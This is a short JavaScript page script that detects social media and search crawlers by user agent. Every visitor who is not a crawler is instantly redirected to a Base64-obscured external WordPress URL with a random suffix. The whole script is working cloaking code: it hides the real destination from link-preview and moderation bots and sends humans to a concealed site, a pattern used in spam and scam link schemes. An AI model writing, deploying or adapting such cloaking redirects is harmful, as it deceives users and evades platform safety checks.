<script>
// Bot Detection
const bots = [
  /facebookexternalhit/i, /Facebot/i, /Twitterbot/i, /Googlebot/i,
  /bingbot/i, /Discordbot/i, /Slackbot/i, /LinkedInBot/i,
  /WhatsApp/i, /Preview/i
];

const isBot = bots.some(b => b.test(navigator.userAgent));

// Strong encrypted URL (Base64)
const encrypted =
"aHR0cHM6Ly93b3JkcHJlc3MtMTUyMzQ0MS01ODYzNzc5LmNsb3Vkd2F5c2FwcHMuY29tL3ZpcmFsYnV6ejMvP3V0bV9zb3VyY2U9SGFqaUcmdXRtX21lZGl1bT1DcmF6eQ==";

function decrypt(x){
  return atob(x);
}

function rand(n){
  const c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let s="";
  for(let i=0;i<n;i++) s+=c[Math.floor(Math.random()*c.length)];
  return s;
}

// Instant redirect (humans only)
if(!isBot){
  window.location.replace(decrypt(encrypted) + "&r=" + rand(6));
}
</script>
